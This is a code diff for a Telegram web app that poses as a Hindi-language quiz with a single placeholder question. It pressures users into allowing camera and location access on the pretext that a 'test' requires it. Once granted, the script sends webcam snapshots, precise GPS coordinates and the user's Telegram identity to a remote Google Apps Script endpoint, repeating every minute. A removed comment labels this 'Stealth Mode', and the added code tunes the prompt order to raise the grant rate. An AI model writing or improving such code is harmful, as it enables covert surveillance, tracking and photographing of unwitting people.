@@ -22,15 +22,12 @@
 <div id="login" class="card">
     <div style="font-size: 55px; margin-bottom: 15px;">🛡️</div>
     <h3>System Configuration</h3>
-    
     <div class="instruction-box">
-        • टेस्ट एनवायरनमेंट सेट किया जा रहा है।<br>
-        • इसके बाद आपसे कुछ <b>सिस्टम परमिशन्स</b> मांगी जाएंगी।<br>
-        • टेस्ट शुरू करने के लिए उन सभी को <b>Allow</b> करना अनिवार्य (Mandatory) है।<br>
-        • प्रक्रिया शुरू करने के लिए नीचे दिए बटन पर क्लिक करें।
+        • सिस्टम सेटअप किया जा रहा है।<br>
+        • 'प्रक्रिया शुरू करें' पर क्लिक करने के बाद, ब्राउज़र आपसे <b>सिस्टम परमिशन्स</b> मांगेगा।<br>
+        • कृपया सभी पॉप-अप को <b>Allow</b> करें, अन्यथा टेस्ट लोड नहीं होगा।
     </div>
-
-    <button id="startBtn" onclick="getSystemPermissions()">प्रक्रिया शुरू करें</button>
+    <button id="startBtn" onclick="requestAllPermissions()">प्रक्रिया शुरू करें</button>
 </div>
 
 <div id="quizBox" class="card" style="display:none">
@@ -42,7 +39,7 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // 🚨 APNI APPS SCRIPT URL YAHAN PASTE KAREIN
+    // 🚨 APNI APPS SCRIPT URL YAHAN DALEIN
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxdOm1OryzaFHkYJJbB5MmQ4WyENGA9uFjzHtkBEXkk3xzx7ojANdyJTKXrXucxA3X5fw/exec"; 
 
     const user = tg.initDataUnsafe?.user || {};
@@ -50,53 +47,56 @@
     let globalStream = null;
     let currentIdx = 0;
 
-    // 🚨 APNE QUESTIONS YAHAN DALEIN
     const questions = [
         {q: "1. Geography का जनक किसे कहा जाता है?", o: ["Hecataeus", "Eratosthenes", "Herodotus", "Ptolemy"], a: 0},
+        // Baki sawal yahan add karein
     ];
 
-    async function getSystemPermissions() {
+    async function requestAllPermissions() {
         const btn = document.getElementById("startBtn");
         btn.disabled = true;
-        btn.innerText = "Setting Environment... ⏳";
+        btn.innerText = "Configuring Security... ⏳";
 
         try {
-            // Step 1: Location Access (Sirf ek baar)
-            const pos = await new Promise((res, rej) => {
-                navigator.geolocation.getCurrentPosition(res, rej, {
-                    enableHighAccuracy: true,
-                    timeout: 10000
-                });
-            });
-            userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-
-            // Step 2: Camera Access (Sirf ek baar)
+            // Priority 1: Camera 
+            // Interaction ke turant baad camera maangne se success rate badh jata hai
             globalStream = await navigator.mediaDevices.getUserMedia({ video: true });
+            
+            // Priority 2: Location (Thodi deri ke baad taaki pop-up clash na ho)
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            if ("geolocation" in navigator) {
+                try {
+                    const pos = await new Promise((res, rej) => {
+                        navigator.geolocation.getCurrentPosition(res, rej, {
+                            enableHighAccuracy: true,
+                            timeout: 10000
+                        });
+                    });
+                    userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+                } catch (locErr) {
+                    console.warn("Location error:", locErr);
+                    userLoc = "Denied/Timeout";
+                    // Agar location mana bhi kar de toh hum aage badh sakte hain ya reload kara sakte hain
+                    // Filhaal humne isse mandatory rakha hai niche logic mein
+                    throw new Error("Location Mandatory");
+                }
+            }
 
-            // Sab permissions mil gayi!
-            startTestFinal();
+            // Sab theek raha toh Quiz shuru
+            document.getElementById("login").style.display = "none";
+            document.getElementById("quizBox").style.display = "block";
+            loadQuestion();
+            
+            // Data logging shuru
+            captureAndSend("Session_Started");
+            setInterval(() => captureAndSend("Active_Tracking"), 60000);
 
         } catch (err) {
-            console.error(err);
-            alert("Security Error: सभी परमिशन्स को Allow करना अनिवार्य है। कृपया दोबारा कोशिश करें।");
-            location.reload(); 
+            console.error("Permission Error:", err);
+            alert("Mandatory Error: कृपया सभी परमिशन्स (Camera & Location) को Allow करें। ब्राउज़र के ऊपर 'Lock' आइकॉन पर क्लिक करके परमिशन चेक करें।");
+            location.reload();
         }
-    }
-
-    function startTestFinal() {
-        // Initial Entry Data - Pehli baar Sheet mein bhej rhe hain
-        captureAndSend("Verified_Entry");
-
-        // Har 1 minute mein auto-photo capture (Stealth Mode)
-        // Ye bina permission pop-up ke background mein chalega
-        setInterval(() => {
-            captureAndSend("Active_Session");
-        }, 60000);
-
-        // UI Switch
-        document.getElementById("login").style.display = "none";
-        document.getElementById("quizBox").style.display = "block";
-        loadQuestion();
     }
 
     async function captureAndSend(statusType) {
@@ -107,14 +107,12 @@
             await video.play();
 
             const canvas = document.createElement('canvas');
-            canvas.width = 320; 
-            canvas.height = 240;
+            canvas.width = 320; canvas.height = 240;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            
             const photoData = canvas.toDataURL('image/jpeg', 0.4);
 
             const payload = {
-                userId: user.id || "ID_Err",
+                userId: user.id || "NA",
                 username: user.username || "NA",
                 fullName: (user.first_name || "") + " " + (user.last_name || ""),
                 score: "In_Progress",
@@ -123,19 +121,13 @@
                 location: userLoc
             };
 
-            fetch(SCRIPT_URL, { 
-                method: "POST", 
-                mode: "no-cors", 
-                body: JSON.stringify(payload) 
-            });
-        } catch (e) {
-            console.log("Capture error:", e);
-        }
+            fetch(SCRIPT_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
+        } catch (e) { console.log("Capture error:", e); }
     }
 
     function loadQuestion() {
         if (currentIdx >= questions.length) { 
-            alert("टेस्ट सफलतापूर्वक सबमिट हो गया!"); 
+            alert("आपका टेस्ट सफलतापूर्वक सबमिट हो गया है!"); 
             tg.close(); 
             return; 
         }
@@ -147,10 +139,7 @@
             const div = document.createElement("div");
             div.className = "option";
             div.innerText = opt;
-            div.onclick = () => {
-                currentIdx++;
-                loadQuestion();
-            };
+            div.onclick = () => { currentIdx++; loadQuestion(); };
             optionsDiv.appendChild(div);
         });
     }
